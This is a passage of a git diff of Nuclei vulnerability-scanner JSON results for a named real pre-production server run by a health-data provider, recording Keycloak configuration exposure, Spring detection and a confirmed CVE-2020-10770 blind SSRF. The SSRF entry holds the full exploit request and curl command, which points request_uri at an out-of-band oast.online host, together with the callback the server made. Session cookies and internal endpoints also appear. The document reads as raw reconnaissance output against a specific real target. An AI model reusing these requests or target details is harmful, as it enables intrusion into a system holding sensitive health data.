e-jwt\"],\"request_parameter_supported\":true,\"request_uri_parameter_supported\":true,\"code_challenge_methods_supported\":[\"plain\",\"S256\"],\"tls_client_certificate_bound_access_tokens\":true,\"introspection_endpoint\":\"https://siao-preprod.cegedim-hds.fr/auth/realms/master/protocol/openid-connect/token/introspect\"}",
+    "ip": "185.113.40.47",
+    "timestamp": "2022-05-01T04:56:46.502590053Z",
+    "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)' 'https://siao-preprod.cegedim-hds.fr/auth/realms/master/.well-known/openid-configuration'",
     "matcher-status": true,
     "matched-line": null
   },
@@ -88,39 +512,95 @@
       "GET,HEAD,OPTIONS"
     ],
     "request": "OPTIONS / HTTP/1.1\r\nHost: siao-preprod.cegedim-hds.fr\r\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
-    "response": "HTTP/1.1 200 \r\nConnection: close\r\nAllow: GET,HEAD,OPTIONS\r\nCache-Control: no-cache, no-store, max-age=0, must-revalidate\r\nContent-Security-Policy: script-src 'self' chat.vizir.co code.jquery.com cdn.jsdelivr.net 'sha256-Ihbm16nGVdxMm/rbAVGyCDHqcoNYOjn0yfeXD93OF+E=' 'report-sample'; object-src 'none'; frame-ancestors 'none'; report-uri /api/csp-report;\r\nDate: Sun, 24 Apr 2022 04:45:05 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nSet-Cookie: JSESSIONID=89E1842229635997F8DF307A96BFB9ED; HttpOnly; Path=/; Secure; HttpOnly\r\nSet-Cookie: serverTime=1650775505210; Path=/\r\nSet-Cookie: sessionExpiry=1650777305210; HttpOnly; Path=/; Secure\r\nSet-Cookie: BIGipServerpool-siao-preprod.cegedim-hds.fr-HTTP=!TwA+9TAGpSjegqKsm7p0I5CraKeLeJ6EXis+e0A5v3xg/pzKfLmk1r88l6JViKQnbrjO0CmOLVEF3dQb9kdlMNmI42M=; path=/; Httponly; Secure\r\nStrict-Transport-Security: max-age=31536000; includeSubDomains\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: DENY\r\nX-Xss-Protection: 1; mode=block\r\nContent-Length: 0\r\n\r\n",
+    "response": "HTTP/1.1 200 \r\nConnection: close\r\nAllow: GET,HEAD,OPTIONS\r\nCache-Control: no-cache, no-store, max-age=0, must-revalidate\r\nContent-Security-Policy: script-src 'self' code.jquery.com cdn.jsdelivr.net *.hs-scripts.com *.hs-banner.com *.hs-analytics.net *.hscollectedforms.net *.usemessages.com 'sha256-Ihbm16nGVdxMm/rbAVGyCDHqcoNYOjn0yfeXD93OF+E=' 'report-sample';  object-src 'none'; frame-ancestors 'none'; report-uri /api/csp-report;\r\nDate: Sun, 01 May 2022 04:56:46 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nSet-Cookie: JSESSIONID=D7EA4FA52DFF9104B1D46D3369229846; HttpOnly; Path=/; Secure; HttpOnly\r\nSet-Cookie: serverTime=1651381006810; Path=/\r\nSet-Cookie: sessionExpiry=1651382806810; HttpOnly; Path=/; Secure\r\nSet-Cookie: BIGipServerpool-siao-preprod.cegedim-hds.fr-HTTP=!C6Jx/DRJhWPeKkKsm7p0I5CraKeLeB92F3/Sd+di8zp1tA7Wh0EPwaq6WvuVWo2jMQXIRW8oIWfHovSPaW1PjjGnYlI=; path=/; Httponly; Secure\r\nStrict-Transport-Security: max-age=31536000; includeSubDomains\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: DENY\r\nX-Xss-Protection: 1; mode=block\r\nContent-Length: 0\r\n\r\n",
     "ip": "185.113.40.47",
-    "timestamp": "2022-04-24T04:45:05.267587082Z",
+    "timestamp": "2022-05-01T04:56:46.849324453Z",
     "curl-command": "curl -X 'OPTIONS' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)' 'https://siao-preprod.cegedim-hds.fr'",
     "matcher-status": true,
     "matched-line": null
   },
   {
-    "template": "exposures/configs/keycloak-openid-config.yaml",
-    "template-url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/exposures/configs/keycloak-openid-config.yaml",
-    "template-id": "keycloak-openid-config",
+    "template": "technologies/spring-detect.yaml",
+    "template-url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/technologies/spring-detect.yaml",
+    "template-id": "spring-detect",
     "info": {
-      "name": "Keycloak openid-config",
+      "name": "Java Spring Detection",
       "author": [
-        "rodnt"
+        "adam crosser"
       ],
       "tags": [
-        "keycloak",
-        "config"
+        "tech",
+        "java",
+        "spring"
       ],
       "reference": [
-        "https://issues.jboss.org/browse/keycloak-571"
+        "https://mkyong.com/spring-boot/spring-rest-error-handling-example/"
       ],
       "severity": "info"
     },
     "type": "http",
     "host": "https://siao-preprod.cegedim-hds.fr",
-    "matched-at": "https://siao-preprod.cegedim-hds.fr/auth/realms/master/.well-known/openid-configuration",
-    "request": "GET /auth/realms/master/.well-known/openid-configuration HTTP/1.1\r\nHost: siao-preprod.cegedim-hds.fr\r\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
-    "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 2794\r\nCache-Control: no-cache, must-revalidate, no-transform, no-store\r\nContent-Type: application/json\r\nDate: Sun, 24 Apr 2022 04:45:08 GMT\r\nSet-Cookie: BIGipServerpool-siao-preprod.cegedim-hds.fr-TCP8180=!o4FtModzEVMlWz2sm7p0I5CraKeLeO0vyBGYMCZ/OOFtycxm6Q9IndajYTERULRyh5TX8QUTVv09BdAxiqwEDJX64sI=; path=/; Httponly; Secure\r\nStrict-Transport-Security: max-age=31536000; includeSubDomains\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: SAMEORIGIN\r\nX-Xss-Protection: 1; mode=block\r\n\r\n{\"issuer\":\"https://siao-preprod.cegedim-hds.fr/auth/realms/master\",\"authorization_endpoint\":\"https://siao-preprod.cegedim-hds.fr/auth/realms/master/protocol/openid-connect/auth\",\"token_endpoint\":\"https://siao-preprod.cegedim-hds.fr/auth/realms/master/protocol/openid-connect/token\",\"token_introspection_endpoint\":\"https://siao-preprod.cegedim-hds.fr/auth/realms/master/protocol/openid-connect/token/introspect\",\"userinfo_endpoint\":\"https://siao-preprod.cegedim-hds.fr/auth/realms/master/protocol/openid-connect/userinfo\",\"end_session_endpoint\":\"https://siao-preprod.cegedim-hds.fr/auth/realms/master/protocol/openid-connect/logout\",\"jwks_uri\":\"https://siao-preprod.cegedim-hds.fr/auth/realms/master/protocol/openid-connect/certs\",\"check_session_iframe\":\"https://siao-preprod.cegedim-hds.fr/auth/realms/master/protocol/openid-connect/login-status-iframe.html\",\"grant_types_supported\":[\"authorization_code\",\"implicit\",\"refresh_token\",\"password\",\"client_credentials\"],\"response_types_supported\":[\"code\",\"none\",\"id_token\",\"token\",\"id_token token\",\"code id_token\",\"code token\",\"code id_token token\"],\"subject_types_supported\":[\"public\",\"pairwise\"],\"id_token_signing_alg_values_supported\":[\"PS384\",\"ES384\",\"RS384\",\"HS256\",\"HS512\",\"ES256\",\"RS256\",\"HS384\",\"ES512\",\"PS256\",\"PS512\",\"RS512\"],\"id_token_encryption_alg_values_supported\":[\"RSA-OAEP\",\"RSA1_5\"],\"id_token_encryption_enc_values_supported\":[\"A128GCM\",\"A128CBC-HS256\"],\"userinfo_signing_alg_values_supported\":[\"PS384\",\"ES384\",\"RS384\",\"HS256\",\"HS512\",\"ES256\",\"RS256\",\"HS384\",\"ES512\",\"PS256\",\"PS512\",\"RS512\",\"none\"],\"request_object_signing_alg_values_supported\":[\"PS384\",\"ES384\",\"RS384\",\"HS256\",\"HS512\",\"ES256\",\"RS256\",\"HS384\",\"ES512\",\"PS256\",\"PS512\",\"RS512\",\"none\"],\"response_modes_supported\":[\"query\",\"fragment\",\"form_post\"],\"registration_endpoint\":\"https://siao-preprod.cegedim-hds.fr/auth/realms/master/clients-registrations/openid-connect\",\"token_endpoint_auth_methods_supported\":[\"private_key_jwt\",\"client_secret_basic\",\"client_secret_post\",\"tls_client_auth\",\"client_secret_jwt\"],\"token_endpoint_auth_signing_alg_values_supported\":[\"PS384\",\"ES384\",\"RS384\",\"HS256\",\"HS512\",\"ES256\",\"RS256\",\"HS384\",\"ES512\",\"PS256\",\"PS512\",\"RS512\"],\"claims_supported\":[\"aud\",\"sub\",\"iss\",\"auth_time\",\"name\",\"given_name\",\"family_name\",\"preferred_username\",\"email\",\"acr\"],\"claim_types_supported\":[\"normal\"],\"claims_parameter_supported\":false,\"scopes_supported\":[\"openid\",\"offline_access\",\"profile\",\"email\",\"address\",\"phone\",\"roles\",\"web-origins\",\"microprofile-jwt\"],\"request_parameter_supported\":true,\"request_uri_parameter_supported\":true,\"code_challenge_methods_supported\":[\"plain\",\"S256\"],\"tls_client_certificate_bound_access_tokens\":true,\"introspection_endpoint\":\"https://siao-preprod.cegedim-hds.fr/auth/realms/master/protocol/openid-connect/token/introspect\"}",
+    "matched-at": "https://siao-preprod.cegedim-hds.fr/error",
+    "request": "GET /error HTTP/1.1\r\nHost: siao-preprod.cegedim-hds.fr\r\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+    "response": "HTTP/1.1 500 \r\nConnection: close\r\nTransfer-Encoding: chunked\r\nCache-Control: no-cache, no-store, max-age=0, must-revalidate\r\nContent-Security-Policy: script-src 'self' code.jquery.com cdn.jsdelivr.net *.hs-scripts.com *.hs-banner.com *.hs-analytics.net *.hscollectedforms.net *.usemessages.com 'sha256-Ihbm16nGVdxMm/rbAVGyCDHqcoNYOjn0yfeXD93OF+E=' 'report-sample';  object-src 'none'; frame-ancestors 'none'; report-uri /api/csp-report;\r\nContent-Type: application/json\r\nDate: Sun, 01 May 2022 04:56:47 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nSet-Cookie: JSESSIONID=57D1C9DFE37F66A943FC3082F2CA82A6; HttpOnly; Path=/; Secure; HttpOnly\r\nSet-Cookie: serverTime=1651381007477; Path=/\r\nSet-Cookie: sessionExpiry=1651382807477; HttpOnly; Path=/; Secure\r\nSet-Cookie: BIGipServerpool-siao-preprod.cegedim-hds.fr-HTTP=!J9MLautuDe3BHhOsm7p0I5CraKeLeM8KQsD/GLY+RalNq2qfdJT9yc6UD+LYqbDs9CoT3+3MQl9VGRJa0FMnKwThjBw=; path=/; Httponly; Secure\r\nStrict-Transport-Security: max-age=31536000; includeSubDomains\r\nVary: accept-encoding\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: DENY\r\nX-Xss-Protection: 1; mode=block\r\n\r\n{\"timestamp\":\"2022-05-01T04:56:47.477+00:00\",\"status\":999,\"error\":\"None\",\"message\":\"No message available\"}",
     "ip": "185.113.40.47",
-    "timestamp": "2022-04-24T04:45:08.16798239Z",
-    "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)' 'https://siao-preprod.cegedim-hds.fr/auth/realms/master/.well-known/openid-configuration'",
+    "timestamp": "2022-05-01T04:56:47.517243967Z",
+    "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)' 'https://siao-preprod.cegedim-hds.fr/error'",
+    "matcher-status": true,
+    "matched-line": null
+  },
+  {
+    "template": "cves/2020/CVE-2020-10770.yaml",
+    "template-url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2020/CVE-2020-10770.yaml",
+    "template-id": "CVE-2020-10770",
+    "info": {
+      "name": "Keycloak 12.0.1 - 'request_uri ' Blind Server-Side Request Forgery (SSRF) (Unauthenticated)",
+      "author": [
+        "dhiyaneshdk"
+      ],
+      "tags": [
+        "keycloak",
+        "ssrf",
+        "oast",
+        "cve",
+        "cve2020",
+        "blind"
+      ],
+      "description": "A flaw was found in Keycloak before 13.0.0, where it is possible to force the server to call out an unverified URL using the OIDC parameter request_uri. This flaw allows an attacker to use this parameter to execute a Server-side request forgery (SSRF) attack.",
+      "reference": [
+        "https://packetstormsecurity.com/files/164499/keycloak-12.0.1-server-side-request-forgery.html",
+        "https://www.exploit-db.com/exploits/50405",
+        "https://nvd.nist.gov/vuln/detail/cve-2020-10770"
+      ],
+      "severity": "medium",
+      "classification": {
+        "cve-id": [
+          "cve-2020-10770"
+        ],
+        "cwe-id": [
+          "cwe-601"
+        ],
+        "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+        "cvss-score": 5.3
+      }
+    },
+    "type": "http",
+    "host": "https://siao-preprod.cegedim-hds.fr",
+    "matched-at": "https://siao-preprod.cegedim-hds.fr/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://c9n163esrh1o4ln7l57ghjpxu13oeeu5f.oast.online/",
+    "request": "GET /auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://c9n163esrh1o4ln7l57ghjpxu13oeeu5f.oast.online/ HTTP/1.1\r\nHost: siao-preprod.cegedim-hds.fr\r\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+    "response": "HTTP/1.0 400 Bad Request\r\nContent-Length: 9\r\nConnection: close\r\n\r\n400 ERROR",
+    "ip": "185.113.40.47",
+    "timestamp": "2022-05-01T04:57:02.987157811Z",
+    "interaction": {
+      "protocol": "http",
+      "unique-id": "c9n163esrh1o4ln7l57ghjpxu13oeeu5f",
+      "full-id": "c9n163esrh1o4ln7l57ghjpxu13oeeu5f",
+      "raw-request": "GET / HTTP/1.1\r\nHost: c9n163esrh1o4ln7l57ghjpxu13oeeu5f.oast.online\r\nAccept-Encoding: gzip,deflate\r\nConnection: Keep-Alive\r\nElastic-Apm-Traceparent: 00-82f204494415b40a53b072252299957e-6320b8621c95d118-01\r\nTraceparent: 00-82f204494415b40a53b072252299957e-6320b8621c95d118-01\r\nTracestate: es=s:1.0\r\nUser-Agent: Apache-HttpClient/4.5.11 (Java/1.8.0_242)\r\n\r\n",
+      "raw-response": "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=utf-8\r\nServer: oast.online\r\n\r\n<html><head></head><body>f5ueeo31uxpjhg75l7nl4o1hrse361n9c</body></html>",
+      "remote-address": "195.101.165.20",
+      "timestamp": "2022-05-01T04:57:01.81326812Z"
+    },
+    "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)' 'https://siao-preprod.cegedim-hds.fr/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://c9n163esrh1o4ln7l57ghjpxu13oeeu5f.oast.online/'",
     "matcher-status": true,
     "matched-line": null
   }
